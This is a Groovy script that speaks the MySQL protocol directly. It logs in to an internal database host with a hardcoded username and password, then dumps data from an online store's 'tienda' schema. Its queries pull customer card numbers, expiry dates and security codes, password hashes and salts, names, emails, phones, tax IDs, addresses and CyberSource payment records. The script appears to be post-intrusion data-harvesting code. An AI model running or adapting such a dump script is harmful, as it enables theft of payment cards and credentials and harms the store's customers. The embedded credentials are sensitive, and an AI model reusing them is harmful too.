import java.net.Socket
import java.net.InetSocketAddress
import java.security.MessageDigest

// === Proven MySQL client pattern (from mysql_evidence.groovy) ===
class Cx { byte[] d; int i = 0
  long le() { int b=d[i]&0xFF;i++;if(b<0xFB)return(long)b;if(b==0xFC){long v=(d[i]&0xFF)|((d[i+1]&0xFF)<<8);i+=2;return v};if(b==0xFD){long v=(d[i]&0xFF)|((d[i+1]&0xFF)<<8)|((d[i+2]&0xFF)<<16);i+=3;return v};long v=0;for(int k=0;k<8;k++){v|=((long)(d[i+k]&0xFF))<<(8*k)};i+=8;return v}
  String ls() { int fb=d[i]&0xFF;if(fb==0xFB){i++;return null};long l=le();String s=new String(d,i,(int)l,'UTF-8');i+=(int)l;return s }
}
class Qx {
  DataInputStream ins; BufferedOutputStream outs; Socket sock
  byte[] rp() { int len=(ins.readUnsignedByte())|(ins.readUnsignedByte()<<8)|(ins.readUnsignedByte()<<16);ins.readUnsignedByte();byte[] pl=new byte[len];ins.readFully(pl);return pl }
  void wp(int seq,byte[] pl) { int len=pl.length;outs.write(len&0xFF);outs.write((len>>8)&0xFF);outs.write((len>>16)&0xFF);outs.write(seq&0xFF);outs.write(pl);outs.flush() }
  boolean auth(String host,int port,String user,String pass,StringBuilder log) {
    sock=new Socket();sock.connect(new InetSocketAddress(host,port),5000);sock.setSoTimeout(15000)
    ins=new DataInputStream(new BufferedInputStream(sock.getInputStream()));outs=new BufferedOutputStream(sock.getOutputStream())
    byte[] p=rp();if((p[0]&0xFF)!=10){log.append("BAD_PROTO\n");return false}
    int i=1;StringBuilder sb=new StringBuilder();while(p[i]!=0){sb.append((char)(p[i]&0xFF));i++};i++;i+=4
    byte[] s1=new byte[8];System.arraycopy(p,i,s1,0,8);i+=8;i++;i+=2;i++;i+=2;i+=2
    int aLen=(p[i]&0xFF);i++;i+=10;int s2Len=Math.max(13,aLen-8);def s2l=[];int av=p.length-i
    for(int k=0;k<Math.min(s2Len,av);k++){if(p[i+k]!=0)s2l.add(p[i+k])}
    byte[] seed=new byte[8+s2l.size()];System.arraycopy(s1,0,seed,0,8);for(int k=0;k<s2l.size();k++)seed[8+k]=(byte)s2l[k]
    def md=MessageDigest.getInstance('SHA-1');byte[] h1=md.digest(pass.getBytes('UTF-8'));byte[] h2=md.digest(h1)
    md.reset();md.update(seed);md.update(h2);byte[] h3=md.digest()
    byte[] tok=new byte[20];for(int j=0;j<20;j++)tok[j]=(byte)((h1[j]^h3[j])&0xFF)
    int caps=0x1|0x200|0x2000|0x8000|0x80000|0x20000
    ByteArrayOutputStream b=new ByteArrayOutputStream()
    b.write(caps&0xFF);b.write((caps>>8)&0xFF);b.write((caps>>16)&0xFF);b.write((caps>>24)&0xFF)
    b.write(0);b.write(0);b.write(0);b.write(1);b.write(33);b.write(new byte[23])
    b.write(user.getBytes('UTF-8'));b.write(0);b.write(tok.length);b.write(tok);b.write('mysql_native_password'.getBytes('UTF-8'));b.write(0)
    wp(1,b.toByteArray());byte[] ap=rp();int at=ap[0]&0xFF
    if(at==0xFF){int code=(ap[1]&0xFF)|((ap[2]&0xFF)<<8);log.append("ERR_"+code+": "+new String(ap,3,ap.length-3,'UTF-8')+"\n");return false}
    if(at==0xFE){log.append("AUTH_SWITCH\n");return false}
    log.append("AUTH_OK\n");return true
  }
  String q(String sql) {
    ByteArrayOutputStream qb=new ByteArrayOutputStream();qb.write(0x03);qb.write(sql.getBytes('UTF-8'))
    wp(0,qb.toByteArray());byte[] r=rp();int b0=r[0]&0xFF
    if(b0==0xFF){int code=(r[1]&0xFF)|((r[2]&0xFF)<<8);return "ERR_"+code+": "+new String(r,3,r.length-3,'UTF-8')}
    if(b0==0x00)return "OK"
    Cx c0=new Cx(d:r);long cc=c0.le()
    def cols=[];(0..<cc).each{byte[] cp=rp();Cx cc2=new Cx(d:cp);4.times{cc2.ls()};cols.add(cc2.ls())}
    rp()
    def rows=[];int guard=0
    while(guard++<1000){byte[] r2=rp();int rb=r2[0]&0xFF;if(rb==0xFE&&r2.length<9)break;if(rb==0xFF){rows.add(["ROWERR"]);break};Cx rc=new Cx(d:r2);def vals=[];(0..<cc).each{def v=rc.ls();vals.add(v==null?"NULL":v.take(200))};rows.add(vals)}
    StringBuilder res=new StringBuilder();res.append("COLS["+cols.join("|")+"]\n");rows.each{res.append("ROW["+it.join("|")+"]\n")};return res.toString()
  }
  void close(){try{sock?.close()}catch(Exception ignored){}}
}

def H='172.27.141.6'; def P=3312; def U='dbcronproductos'; def PW='0c1A0ZW0Kh#wjqdRHV$b63A'

// Helper: fresh connection per query
def qry = { String sql ->
  def log=new StringBuilder(); def mc=new Qx()
  try {
    if(!mc.auth(H,P,U,PW,log)) return "AUTH_FAIL: "+log
    def r=mc.q(sql); mc.close(); return r
  } catch(Exception e) { mc.close(); return "EXCEPTION: "+e.getMessage() }
}

println "=== COUNT KEY TABLES (tienda) ==="
println "pedidos:         " + qry("SELECT COUNT(*) FROM tienda.pedidos")
println "clientes:        " + qry("SELECT COUNT(*) FROM tienda.clientes")
println "clientescont:    " + qry("SELECT COUNT(*) FROM tienda.clientescontrasena")
println "datostarjeta:    " + qry("SELECT COUNT(*) FROM tienda.datostarjeta")
println "cybersource_sears: " + qry("SELECT COUNT(*) FROM tienda.cybersource_sears")
println "cybersource_trans: " + qry("SELECT COUNT(*) FROM tienda.cybersource_transacciones")
println "conciliacion_sears: " + qry("SELECT COUNT(*) FROM tienda.conciliacion_sears")
println "datos_pedido:    " + qry("SELECT COUNT(*) FROM tienda.datos_pedido")
println "datos_facturacion: " + qry("SELECT COUNT(*) FROM tienda.datos_facturacion")
println "bines:           " + qry("SELECT COUNT(*) FROM tienda.bines")

println "\n=== SCHEMA pedidos ==="
println qry("SELECT COLUMN_NAME,COLUMN_TYPE FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='tienda' AND TABLE_NAME='pedidos' ORDER BY ORDINAL_POSITION")

println "\n=== SCHEMA datostarjeta ==="
println qry("SELECT COLUMN_NAME,COLUMN_TYPE FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='tienda' AND TABLE_NAME='datostarjeta' ORDER BY ORDINAL_POSITION")

println "\n=== SCHEMA clientescontrasena ==="
println qry("SELECT COLUMN_NAME,COLUMN_TYPE FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='tienda' AND TABLE_NAME='clientescontrasena' ORDER BY ORDINAL_POSITION")

println "\n=== SAMPLE pedidos (tarjetas) ==="
println qry("SELECT idpedido,fechapedido,tipotarjeta,nombre,numero,mes,ao,seguridad,total,correo FROM tienda.pedidos WHERE numero IS NOT NULL AND numero!='' ORDER BY idpedido DESC LIMIT 10")

println "\n=== SAMPLE clientescontrasena ==="
println qry("SELECT idcliente,correo,contrasena,salt FROM tienda.clientescontrasena ORDER BY idcliente DESC LIMIT 15")

println "\n=== SAMPLE clientes ==="
println qry("SELECT idcliente,nombre,apellidopaterno,apellidomaterno,correo,telefono,rfc FROM tienda.clientes ORDER BY idcliente DESC LIMIT 10")

println "\n=== SAMPLE datostarjeta ==="
println qry("SELECT * FROM tienda.datostarjeta ORDER BY id DESC LIMIT 5")

println "\n=== SAMPLE cybersource_sears ==="
println qry("SELECT * FROM tienda.cybersource_sears ORDER BY id DESC LIMIT 5")

println "\n=== SAMPLE datos_pedido (direcciones) ==="
println qry("SELECT * FROM tienda.datos_pedido ORDER BY idpedido DESC LIMIT 5")

println "\n=== SAMPLE datos_facturacion ==="
println qry("SELECT * FROM tienda.datos_facturacion ORDER BY id DESC LIMIT 5")

println "\n=== RECENT SEARS CONCILIATION ==="
println qry("SELECT * FROM tienda.conciliacion_sears ORDER BY id DESC LIMIT 5")

println "\n=== DONE ==="
